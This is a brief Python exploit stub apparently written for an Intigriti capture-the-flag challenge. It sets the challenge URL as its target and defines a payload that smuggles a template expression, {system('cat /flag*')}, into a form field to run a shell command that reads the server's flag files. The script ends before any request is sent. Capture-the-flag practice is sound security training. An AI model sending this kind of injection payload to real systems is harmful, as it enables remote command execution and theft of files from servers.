#!/usr/bin/python3

from requests import get, post

url = "https://smartypants.ctf.intigriti.io/"

payload = {'data': '{system(\'cat /flag*\')}'}

